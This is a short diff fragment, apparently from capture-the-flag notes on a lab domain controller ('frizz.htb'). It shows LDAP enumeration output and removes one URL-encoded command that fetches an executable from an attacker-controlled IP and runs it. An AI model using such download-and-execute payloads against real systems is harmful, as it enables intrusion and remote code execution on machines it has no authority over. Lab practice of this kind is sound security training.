@@ -393,4 +393,3 @@ LDAP        10.10.11.60     389    frizzdc.frizz.htb Domain SID S-1-5-21-2386970
 
 
 
-curl%20http%3A%2F%2F10.10.15.37%3A8000%2Fxeu2.exe%20-o%20xeu2.exe%20%26%26%20.%5Cxeu2.exe
